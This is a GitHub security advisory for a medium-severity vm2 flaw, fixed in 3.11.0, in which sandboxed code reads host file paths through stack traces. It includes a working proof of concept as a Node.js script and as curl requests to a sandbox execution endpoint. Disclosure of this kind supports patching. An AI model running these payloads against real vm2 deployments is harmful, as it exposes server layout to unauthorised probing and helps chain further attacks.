# [M] vm2 is Vulnerable to Host File Path Disclosure via Stack Trace Information Leak

## Summary
Severity: Medium
Advisory: GHSA-v27g-jcqj-v8rw
CVE: CVE-2026-44002
CWE: CWE-209
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-v27g-jcqj-v8rw
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.0

## Details
### Summary
vm2's `CallSite` wrapper class (intended as a safe wrapper for V8's native CallSite) blocks `getThis()` and `getFunction()` to prevent host object leakage, but allows `getFileName()` to return unsanitized host absolute paths. Any sandboxed code can extract the full directory structure, library paths, and framework versions of the host server.

### Details
In `lib/setup-sandbox.js:436-466`, the `CallSite` class overrides `getThis()` and `getFunction()` with `undefined` to prevent host object references from leaking into the sandbox. However, the following methods pass through unsanitized values from the original V8 CallSite object:

- `getFileName()` — returns host absolute paths like `/app/node_modules/vm2/lib/vm.js`
- `getLineNumber()`, `getColumnNumber()` — exact source locations
- `getFunctionName()`, `getMethodName()`, `getTypeName()` — internal function names

Two exploitation paths exist:
1. **Default `error.stack`**: `new Error().stack` includes host frame paths in the formatted string
2. **Custom `prepareStackTrace`**: Attacker can set `Error.prepareStackTrace` to directly call `getFileName()` on each CallSite, extracting a clean list of all host paths

### PoC

**Library-level PoC (Node.js script — primary):**
```javascript
const { VM } = require("vm2");
const vm = new VM();

// Path A — Default error.stack
const result1 = vm.run(`try { null.x; } catch(e) { e.stack }`);
console.log(result1);
// Output includes: /app/node_modules/vm2/lib/vm.js:289:18
//                   /app/src/server.js:49:20

// Path B — prepareStackTrace extraction
const result2 = vm.run(`
  Error.prepareStackTrace = function(e, sst) {
    return sst.map(function(s) { return s.getFileName(); }).join(", ");
  };
  new Error().stack
`);
console.log(result2);
// Output: vm.js, node:vm, /app/node_modules/vm2/lib/vm.js, /app/src/sandbox.js, ...
```

**HTTP demonstration:**
```bash
# Default error.stack
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"try { null.x; } catch(e) { e.stack }"}'
# Result includes host paths: /app/src/server.js, /app/node_modules/express/...

# prepareStackTrace extraction
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"Error.prepareStackTrace = function(e, sst) { return sst.map(function(s) { return s.getFileName(); }).join(\", \"); }; new Error().stack"}'
# Result: /app/node_modules/vm2/lib/vm.js, /app/src/sandbox.js, /app/src/server.js, ...
```

### Impact
- **Information Disclosure**: Host directory structure, library paths, framework versions, and internal architecture are exposed to sandboxed code.
- **Attack Chain**: Leaked paths enable precise targeting for other vulnerabilities.
- **Scope**: All applications using vm2. No special configuration required.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-v27g-jcqj-v8rw
- https://nvd.nist.gov/vuln/detail/CVE-2026-44002
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.0
